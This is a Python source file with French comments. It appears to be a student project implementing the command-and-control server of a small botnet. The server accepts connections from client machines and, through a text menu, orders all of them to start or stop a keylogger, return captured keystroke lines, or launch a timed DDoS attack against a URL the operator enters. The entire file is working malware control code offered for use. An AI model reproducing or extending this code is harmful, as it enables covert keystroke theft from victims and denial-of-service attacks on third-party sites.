import socket
import time
import argparse


class MasterProject:
    def __init__(self,connexion_principale):                            #On déclare notre socket en tant qu'objet sous le nom connexion_principale
        self.connexion_principale = socket                              #On crée un liste qui va permettre de stocker toutes les connexions
        self.liste_client = liste_client =[]                            

    def run(self, connexion_principale, liste_client):


        self.parametres()                                                             #On appel notre méthode afin de lancer l'argparse dès le début du programme
        connexion_principale = socket.socket(socket.AF_INET, socket.SOCK_STREAM)      #On instancie notre socket
        connexion_principale.bind((host, port_serveur))                                
        print("Le serveur est demarré sur le port {}".format(port_serveur))           


        connexion_principale.listen(5)                                                #On détermine le nombre de client maximum                  


        print("Le serveur écoute à présent sur le port {}".format(port_serveur))
        nombre_client_connecte = int(input("Sur combien de clients souhaitez-vous envoyer un ordre? : "))
        
        
        compteur_client = 0
        while compteur_client < nombre_client_connecte:                                                    #On place tous nos clients dans une liste 
            connexion_avec_client, infos_connexion = connexion_principale.accept()
            ip, port_client = str(infos_connexion[0]), str(infos_connexion[1]) 
            liste_client.append(connexion_avec_client)
            print ("Connecter avec " + ip + ":" + port_client)

            compteur_client += 1
            

        print ("Nombres de machines utilisée : ", nombre_client_connecte)
        print("->Pour demarrer le Keylogger ecrivez : start_log")									#Menu
        print("->Pour stopper le Keylogger ecrivez : stop_log")
        print("->Pour récupérer les dernieres lignes enregistrée du Keylogger ecrivez : get_log")
        print("->Pour faire une attaque ddos ecrivez : ddos")
        print("->Pour finir la connexion avec les clients ecrivez : fin_connexion")
        print("->Pour fermer le serveur ecrivez : fin_serveur")
        question = input("Que souhaitez-vous faire ?? : ")   
        indice = 0

        while question != "fin_serveur":                                                     #En fonction du mot entré dans le input on lance une méthode 
       
            if question == "start_log" :                                                            
                self.start_log(liste_client, nombre_client_connecte)
                indice +=1
                question = input("Que souhaitez-vous faire ?? : ")

            elif question == "stop_log":
                if indice == 1:
                    self.stop_log(liste_client, nombre_client_connecte)
                    question = input("Que souhaitez-vous faire ?? : ")
                else :
                    print("Le keylloger n'est pas allumé, vous ne pouvez pas l'éteindre")
                    question = input("Que souhaitez-vous faire ?? : ")
                
            elif question == "get_log":
                self.get_log(liste_client, nombre_client_connecte)
                question = input("Que souhaitez-vous faire ?? : ")
                    
            elif question == "ddos":
                self.ddos(liste_client, nombre_client_connecte)
                question = input("Que souhaitez-vous faire ?? : ")

            elif question == "fin_connexion":
                self.fin_client(liste_client, nombre_client_connecte)
                question = input("Que souhaitez-vous faire ?? : ")

            elif question == "fin_serveur":
                print("Le serveur est fermé !")       
                connexion_principale.close()
            else:                                                                           
                print("Erreur : je ne connais pas cette ordre")
                question = input("Que souhaitez-vous faire ?? : ")




    def start_log(self, liste_client, nombre_client_connecte):                                          #Méthode qui envoi un mot à tous les clients pour lancer le keylogger 
        i = 0                                                                   #Le maitre reçoit un mot pour dire que le keylogger est lancé     
        while i < nombre_client_connecte :
            ordre = "start_Keylogger"
            liste_client[i].send(ordre.encode("utf-8"))
            retour = liste_client[i].recv(1024).decode("utf-8")
            print (retour)
            i += 1
        
       
    def stop_log(self, liste_client, nombre_client_connecte):                                        #Méthode qui envoi un mot à tous les clients pour stopper le keylogger 
        i = 0                                                                #Le maitre reçoit un mot pour dire que le keylogger est stoppé                                         
        while i < nombre_client_connecte :
            ordre = "stop_Keylogger"
            liste_client[i].send(ordre.encode("utf-8"))
            retour = liste_client[i].recv(1024).decode("utf-8")
            print (retour)
            i += 1

    def get_log(self, liste_client, nombre_client_connecte):                                        #Méthode qui envoi un mot à tous les clients pour recevoir les lignes du fichiers keylogger
        i = 0                                                               #On demande à l'utilisateur le nombre de ligne qu'il souhaite recevoir et envoie aux clients 
        k = 0                                                              
        j = 0
        
        while i < nombre_client_connecte :
            ordre = "get_log"
            liste_client[i].send(ordre.encode("utf-8"))                                         
            i += 1 

        nb_lignes = input("Entrez le nombre de ligne que vous souhaitez recuperer : ")

        while k < nombre_client_connecte :
            liste_client[k].send(nb_lignes.encode("utf-8"))
            k += 1

        while j < nombre_client_connecte :
            lignes_retournees = liste_client[j].recv(1024).decode("utf-8")     #On affiche les lignes demandés 
            print (lignes_retournees, "\n")
            j += 1

    def ddos(self, liste_client, nombre_client_connecte):                                           #Méthode qui envoit aux clients un mot qui permet de commancer l'attaque ddos 
        i = 0                                                               #On demande à l'utilisateur la cible et le temps, on envoie le mot  
        j = 0                                                               #On reçoit un message comme quoi la requête s'est dérouler correctement   
        k = 0
        l = 0

        while i < nombre_client_connecte :
            ordre = "start_ddos"
            liste_client[i].send(ordre.encode("utf-8"))
            i += 1

        ip_ddos = str(input("Sur quelle url souhaitez-vous envoyez la requete : "))

        while k < nombre_client_connecte :
            liste_client[k].send(ip_ddos.encode("utf-8"))
            k += 1

        temps_en_senconde = input("Apres combien de temps souhaitez vous lancez l'attaque? (en seconde) : ")

        while l < nombre_client_connecte :
            liste_client[l].send(temps_en_senconde.encode("utf-8"))
            l += 1

        while j < nombre_client_connecte :   
            retour = liste_client[j].recv(1024).decode("utf-8")
            print (retour)
            j += 1 


    def fin_client(self, liste_client, nombre_client_connecte):                                 #Méthode qui demande aux clients de se fermer 
        i = 0
        while i < nombre_client_connecte :
            ordre = "fin_connexion"
            liste_client[i].send(ordre.encode("utf-8"))
            retour = liste_client[i].recv(1024).decode("utf-8")
            print (retour)
            i += 1

    def parametres(self):                                              #Méthode qui permet d'établir les paramètres de ligne de commande(terminal) : l'ip et le port du serveur 

        global port_serveur
        global host
       
        parametre = argparse.ArgumentParser()
        parametre.add_argument("-p","--port",type=int,dest="port",help="port du serveur")
        parametre.add_argument("-i","--ip",dest="host",help="ip de l'hote du serveur")
        args = parametre.parse_args()

        if args.port != 0 :
            port_serveur = args.port
        if args.host != 0 :
            host = args.host

            
           
         
            
      
master = MasterProject(socket)
master.run(socket, [])                                          #Appel de fonction pour lancer le programme 



